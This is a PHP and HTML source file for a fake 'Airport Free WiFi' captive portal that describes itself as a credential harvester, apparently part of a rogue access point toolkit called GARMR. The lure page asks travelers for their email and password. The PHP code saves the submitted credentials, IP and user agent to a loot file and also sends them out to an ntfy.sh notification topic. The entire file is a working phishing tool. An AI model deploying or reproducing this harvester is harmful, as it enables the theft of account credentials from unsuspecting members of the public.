<?php
// GARMR AIRPORT Portal - Credential Harvester
$loot_file = "/root/loot/garmr/credentials.txt";
$ntfy_topic = trim(@file_get_contents("/root/.garmr_ntfy_topic"));

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $email = isset($_POST["email"]) ? $_POST["email"] : "";
    $password = isset($_POST["password"]) ? $_POST["password"] : "";
    $timestamp = date("Y-m-d H:i:s");
    $ip = $_SERVER["REMOTE_ADDR"];
    $ua = $_SERVER["HTTP_USER_AGENT"];
    @mkdir(dirname($loot_file), 0755, true);
    $entry = "[$timestamp] AIRPORT | IP: $ip | Email: $email | Pass: $password | UA: $ua\n";
    file_put_contents($loot_file, $entry, FILE_APPEND | LOCK_EX);
    
    if (!empty($ntfy_topic)) {
        $msg = "✈️ AIRPORT CREDS\n📧 $email\n🔑 $password\n🌐 $ip";
        // PHP native curl (shell_exec unreliable)
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://ntfy.sh/$ntfy_topic");
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $msg);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ["Title: GARMR Creds", "Priority: high", "Tags: key,rotating_light"]);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        curl_exec($ch);
        curl_close($ch);
        
    }
    
    header("Location: /success.html");
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Airport Free WiFi</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #1a365d 0%, #2c5282 50%, #4299e1 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 16px;
            padding: 40px;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            text-align: center;
        }
        .logo {
            width: 100px;
            height: 100px;
            margin: 0 auto 20px;
        }
        .logo svg {
            width: 100%;
            height: 100%;
        }
        h1 {
            color: #1a365d;
            font-size: 22px;
            margin-bottom: 8px;
            font-weight: 600;
        }
        .subtitle {
            color: #666;
            margin-bottom: 30px;
            font-size: 14px;
        }
        .form-group {
            margin-bottom: 16px;
            text-align: left;
        }
        label {
            display: block;
            color: #1a365d;
            font-weight: 500;
            margin-bottom: 6px;
            font-size: 14px;
        }
        input {
            width: 100%;
            padding: 14px 16px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.2s;
        }
        input:focus {
            outline: none;
            border-color: #4299e1;
        }
        button {
            width: 100%;
            padding: 16px;
            background: #2c5282;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
            transition: background 0.2s;
        }
        button:hover {
            background: #1a365d;
        }
        .info-box {
            margin-top: 20px;
            padding: 15px;
            background: #EBF8FF;
            border-radius: 8px;
            font-size: 13px;
            color: #2c5282;
            border-left: 4px solid #4299e1;
            text-align: left;
        }
        .terms {
            margin-top: 20px;
            font-size: 11px;
            color: #999;
            line-height: 1.5;
        }
        .flight-info {
            display: flex;
            justify-content: space-around;
            margin-top: 15px;
            padding-top: 15px;
            border-top: 1px solid #e0e0e0;
        }
        .flight-info span {
            font-size: 12px;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
                <!-- Airport/Airplane icon -->
                <circle cx="50" cy="50" r="48" fill="#1a365d"/>
                <circle cx="50" cy="50" r="44" fill="none" stroke="#4299e1" stroke-width="2"/>
                <!-- Airplane -->
                <path d="M25 55 L45 50 L50 35 L55 50 L75 55 L55 58 L50 75 L45 58 Z" fill="white"/>
                <!-- Contrail -->
                <line x1="20" y1="60" x2="35" y2="55" stroke="white" stroke-width="2" opacity="0.5"/>
                <line x1="15" y1="65" x2="30" y2="58" stroke="white" stroke-width="1.5" opacity="0.3"/>
            </svg>
        </div>

        <h1>Airport Free WiFi</h1>
        <p class="subtitle">Complimentary internet for travelers</p>

        <form method="POST" action="">
            <div class="form-group">
                <label for="email">Email Address</label>
                <input type="email" id="email" name="email" placeholder="your@email.com" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Password" required>
            </div>
            <button type="submit">Connect to WiFi</button>
        </form>

        <div class="info-box">
            <strong>✈️ Traveler Info</strong><br>
            Free WiFi for 2 hours. Premium unlimited access available.
        </div>

        <div class="flight-info">
            <span>🛫 Departures</span>
            <span>🛬 Arrivals</span>
            <span>🍽️ Dining</span>
        </div>

        <p class="terms">
            By connecting, you agree to the Airport Authority Terms of Service.
            Network usage may be monitored for security purposes.
        </p>
    </div>
</body>
</html>
